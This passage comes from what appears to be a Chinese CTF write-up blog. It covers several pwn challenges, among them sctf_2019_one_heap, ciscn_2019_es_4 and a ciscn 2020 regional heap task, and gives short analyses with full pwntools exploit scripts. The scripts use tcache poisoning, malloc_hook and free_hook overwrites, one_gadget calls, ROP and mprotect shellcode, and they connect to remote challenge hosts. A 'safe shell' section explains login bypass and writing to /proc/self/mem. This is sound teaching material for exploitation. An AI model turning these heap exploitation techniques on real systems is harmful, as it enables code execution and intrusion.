class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))        sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))bss = <span class="hljs-number">0x6021C0</span>pop_rdi = <span class="hljs-number">0x0000000000401193</span>pop_rsi_r15 = <span class="hljs-number">0x0000000000401191</span>pop_rsp_r13_r14_r15 = <span class="hljs-number">0x000000000040118d</span>orw = flat([pop_rdi,<span class="hljs-number">0</span>,pop_rsi_r15,bss + <span class="hljs-number">0x400</span>,<span class="hljs-number">0</span>,elf.plt[<span class="hljs-string">'read'</span>],pop_rsp_r13_r14_r15,bss + <span class="hljs-number">0x400</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>])sa(<span class="hljs-string">'name'</span>,str(orw))<span class="hljs-comment"># sa('name','chumen77'*10)</span>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'2'</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'3'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'4'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'5'</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">3</span>)free(<span class="hljs-number">2</span>)malloc_hook = <span class="hljs-number">0x3c4afd</span> + libcbaseadd(<span class="hljs-number">0x68</span>,p64(malloc_hook))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'7'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'8'</span>)rsp_add_0x38 = libc.search(asm(<span class="hljs-string">"add rsp , 0x38\nret"</span>)).next()data = <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(rsp_add_0x38 + libcbase)<span class="hljs-comment"># data = 3 * '\x00' + p64(0xdeadbeef)</span>add(<span class="hljs-number">0x68</span>,data)<span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'20'</span>)sleep(<span class="hljs-number">0.2</span>)pop_rdx = libcbase + libc.search(asm(<span class="hljs-string">"pop rdx\nret"</span>)).next()pop_rsp = libcbase + libc.search(asm(<span class="hljs-string">"pop rsp\nret"</span>)).next()mprotect = libcbase + libc.sym[<span class="hljs-string">'mprotect'</span>]payload = flat([pop_rdi,<span class="hljs-number">0x00602000</span>,pop_rsi_r15,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>,pop_rdx,<span class="hljs-number">7</span>,mprotect,<span class="hljs-number">0x602628</span>])shellcode = shellcraft.linux.openat(<span class="hljs-number">0</span>,<span class="hljs-string">'/flag'</span>,<span class="hljs-number">0</span>) + shellcraft.linux.read(<span class="hljs-number">3</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>) + shellcraft.linux.write(<span class="hljs-number">1</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>)sleep(<span class="hljs-number">0.2</span>)s(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + payload + p64(<span class="hljs-number">0</span>) + asm(shellcode))<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="延伸做法"><a href="#延伸做法" class="headerlink" title="延伸做法"></a>延伸做法</h3><p><a href="https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/" target="_blank" rel="noopener">https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/</a></p><p>其是用<code>house_of_orange+setcontext+0x35</code>调用read传入ropchain来完成攻击。</p><p>如果无法控制<code>free_hook</code>且在libc-2.23情况下可以利用这个办法。</p><h2 id="sctf-2019-one-heap"><a href="#sctf-2019-one-heap" class="headerlink" title="sctf_2019_one_heap"></a><code>sctf_2019_one_heap</code></h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><ul><li>不可指定idx，来操作chunk，只能操作当前malloc 分配chunk对应的heap地址</li><li>只有free 和 add，free可以4次，add可以<code>0xf</code>次</li></ul><h3 id="难点-2"><a href="#难点-2" class="headerlink" title="难点"></a>难点</h3><ul><li>无show函数</li><li>有限的free次数，只能通过合适的堆技巧或者爆破来完成攻击</li></ul><p>此题由于只能4次free，其中3次free还是直接必须执行的，只剩下的一次就尤为关键。目标就是在其free以后，有办法让再次申请的chunk可以修改到这个free chunk对应tcache bin的fd，来进行tcache attack。</p><p>当一个堆A同时在tcache里面，又在unsortbin里面，这种情况是常见的，并且也是危险的。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/T5GJ9H.png" srcset="/img/loading.gif" alt></p><p>当先申请一个小的chunk C，其肯定是在此chunk上按照unsortbin的规则，分割一下，留下一个小的unsortbin bin。<br><img src="http://qiqianyun.chumen77.xyz/uPic/yB8mNI.png" srcset="/img/loading.gif" alt></p><p>然后接着申请一个相同于chunk A大小的堆，就有机会改到这个2个被分割完的小chunk。<strong>比如改0x61的unsortbin的信息，可以改其size，并且提前在chunk B处伪造好数据，即可完成一个fake 的 unsortbin。</strong></p><p> <img src="http://qiqianyun.chumen77.xyz/uPic/pCToHT.png" srcset="/img/loading.gif" alt></p><p>倘若再申请一个合适的大小，比如0x68，即可改到chunk B的数据。此题也就是改其fd指针，即可接着完成tcache attack。</p><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./sctf_2019_one_heap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]roc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\n'</span>)    free()    free()    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    <span class="hljs-comment">#夹在top chunk前面，防止进入unsortbin时直接合并。并且fake一些数据，留着绕过后面的检查。</span>    add(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0x20</span>))    free()    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    free()    add(<span class="hljs-number">0x28</span>,p16(<span class="hljs-number">0x9750</span>) + <span class="hljs-string">'\n'</span>)    debug()    <span class="hljs-comment"># 修改剩下0x60大小的unsortbin的大小为0x90，且前面已经有fake的数据，不会让程序crush</span>    add(<span class="hljs-number">0x7f</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x91</span>) +<span class="hljs-string">'\n'</span>)    payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>    add(<span class="hljs-number">0x7f</span>,payload + <span class="hljs-string">'\n'</span>)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">16</span>)        leak = u64(io.recv(<span class="hljs-number">8</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./sctf_2019_one_heap'</span>)        <span class="hljs-comment"># io = remote('node3.buuoj.cn',28690)</span>        <span class="hljs-keyword">continue</span>leak = leak &gt;&gt; <span class="hljs-number">16</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">4110208</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)malloc_hook = <span class="hljs-number">0x3ebc30</span> + libc_basepayload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0x41</span>) + p64(malloc_hook<span class="hljs-number">-8</span>)debug()<span class="hljs-comment"># 修改0x40 tcache bin的chain</span>add(<span class="hljs-number">0x68</span>,payload)debug()add(<span class="hljs-number">0x38</span>,<span class="hljs-string">'\n'</span>)realloc=libc_base+libc.symbols[<span class="hljs-string">'realloc'</span>] + roc[<span class="hljs-number">1</span>]one = <span class="hljs-number">0x10a38c</span> + libc_basepayload = p64(one) + p64(realloc)add(<span class="hljs-number">0x38</span>,payload + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'\n'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="ciscn-2019-es-4"><a href="#ciscn-2019-es-4" class="headerlink" title="ciscn_2019_es_4"></a><code>ciscn_2019_es_4</code></h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>利用off by null，构造chunk overlapping，然后tcache attack即可。</p><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_es_4'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26094</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sl(<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sl(<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))    sleep(<span class="hljs-number">0.1</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>) add(<span class="hljs-number">2</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">'\n'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     add(i+<span class="hljs-number">4</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     free(i+<span class="hljs-number">4</span>)     add(i+<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     free(i+<span class="hljs-number">4</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xa0</span>+p64(<span class="hljs-number">0x1e0</span>))free(<span class="hljs-number">3</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x90</span>)+p64(<span class="hljs-number">0xa0</span>)+p64(<span class="hljs-number">0x00000000006022B0</span>))add(<span class="hljs-number">4</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>)*<span class="hljs-number">2</span>)add(<span class="hljs-number">6</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>)show(<span class="hljs-number">6</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebc0a</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)free(<span class="hljs-number">6</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">7</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">15</span>+p64(<span class="hljs-number">0xb1</span>)+p64(<span class="hljs-number">0x3ed8e8</span>+libcbase))add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">9</span>,<span class="hljs-number">0xa0</span>,p64(libcbase+rce18[<span class="hljs-number">1</span>]))free(<span class="hljs-number">8</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn 2020 华中分区赛部分wp</title>
    <link href="/2020/09/24/ciscn%202020%20%E5%8D%8E%E4%B8%AD%E5%88%86%E5%8C%BA%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/09/24/ciscn%202020%20%E5%8D%8E%E4%B8%AD%E5%88%86%E5%8C%BA%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2020-华中分区赛部分wp"><a href="#ciscn-2020-华中分区赛部分wp" class="headerlink" title="ciscn  2020 华中分区赛部分wp"></a>ciscn  2020 华中分区赛部分wp</h1><p>第一天跟6级冲突了，基本没玩，第二天做完一个题ida炸了，怎么也打不开。最近，总是关键时刻掉链子了😭。</p><h2 id="logic-mistake"><a href="#logic-mistake" class="headerlink" title="logic_mistake"></a><code>logic_mistake</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>可以申请16个堆，size信息放在其chunk地址的下8个字节</li><li>通过strdup来进行申请堆， <code>strdup</code> 相当于<code>s = input() malloc(stren(s))</code> </li></ul><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><ul><li><code>read(0, *((void **)&amp;unk_202060 + 2 * v1), dword_202068[4 * v1]);</code> 这里由于是这样的判断，结合add的<code>strdup</code> 就造成了堆溢出。</li></ul><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>申请8个0x90大小的堆块，size 填成0xff，留着溢出</li><li>申请3个0x80大小的堆块，size 填成0xff，留着溢出</li><li>释放前8个堆，最后一个进入unsortbin</li><li>申请一个0x90的堆块，会申请到tcache的头的堆，也就是第7个堆</li><li>edit溢出修改到next chunk的size 和prev size，让show 出libc信息</li><li>接着修改unsortbin的size 为0x80，开始进行tcache attack，也就是溢出修改tcache chian上的堆地址，修改为free hook</li><li>然后申请堆到free hook，打one gadgets<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3></li></ul><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'172.20.12.248'</span>,<span class="hljs-number">50001</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'Input index:'</span>,str(idx))    sla(<span class="hljs-string">'Input size'</span>,str(size))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span>    add(i,<span class="hljs-number">0xff</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">10</span>,<span class="hljs-number">0xff</span>,payload)add(<span class="hljs-number">11</span>,<span class="hljs-number">0xff</span>,payload)add(<span class="hljs-number">12</span>,<span class="hljs-number">0xff</span>,payload)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)free(<span class="hljs-number">7</span>)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span>add(<span class="hljs-number">6</span>,<span class="hljs-number">0xff</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + <span class="hljs-string">'2'</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>)edit(<span class="hljs-number">6</span>,payload)show(<span class="hljs-number">6</span>)ru(<span class="hljs-string">'22222222'</span>)r(<span class="hljs-number">8</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>)edit(<span class="hljs-number">6</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">13</span>,<span class="hljs-number">0xff</span>,payload)free(<span class="hljs-number">11</span>)free(<span class="hljs-number">10</span>)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_basepayload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0x80</span>) + p64(free_hook)edit(<span class="hljs-number">13</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">14</span>,<span class="hljs-number">0xff</span>,payload)one = <span class="hljs-number">0x4f3c2</span> + libc_baseadd(<span class="hljs-number">15</span>,<span class="hljs-number">0xff</span>,payload)edit(<span class="hljs-number">15</span>,p64(one))free(<span class="hljs-number">14</span>)itr()</code></pre></div><h2 id="safe-shell"><a href="#safe-shell" class="headerlink" title="safe shell"></a>safe shell</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="登陆函数："><a href="#登陆函数：" class="headerlink" title="登陆函数："></a>登陆函数：</h4><div class="hljs"><pre><code class="hljs c">!<span class="hljs-built_in">strcmp</span>(name, &amp;s) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(password, &amp;ptr);</code></pre></div><p>在最后的验证是用strcmp，会被<code>\x00</code>给截断，并且服务器上的admin.txt上来也是空的。直接设置name与password均为<code>\x00</code>即可绕过。</p><h4 id="shell函数："><a href="#shell函数：" class="headerlink" title="shell函数："></a>shell函数：</h4><ul><li>都是围绕<code>/proc/self/</code>目录下的操作</li><li><code>set_lseek</code>可以修改读取某文件指针，也就是open以后默认操作读写指针是指向文件的开头的，通过它可以修改这个指针的在这个文件上指向</li><li>write 一次只能写8字节</li></ul><p>重点是了解<code>/proc/pid/</code>目录下文件的信息与含义。<br><a href="https://blog.csdn.net/enweitech/article/details/53391567" target="_blank" rel="noopener">https://blog.csdn.net/enweitech/article/details/53391567</a></p><p><strong>特别注意 mmaps 和 mem</strong></p><h5 id="maps"><a href="#maps" class="headerlink" title="maps"></a>maps</h5><p>是当前进程的内存映射关系，存放着内存分布图，类似于gdb中vmmap，可以泄漏一下程序的基地址。</p><h5 id="mem"><a href="#mem" class="headerlink" title="mem"></a>mem</h5><ul><li>包含了程序进程在内存中的内容；</li><li>通过修改该文件相当于直接修改当前进程的内存</li><li>/ proc / $pid / mem以与进程中相同的方式显示$pid的内存映射,即伪文件中偏移x处的字节与进程中地址x处的字节相同.。</li><li>结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</li></ul><p>写入mem文件也相当于修改程序在内存的本身了，结合mmaps的程序基址，在合适的地方写入shellcode，让程序走到这里即可get shell</p><h4 id="防御函数："><a href="#防御函数：" 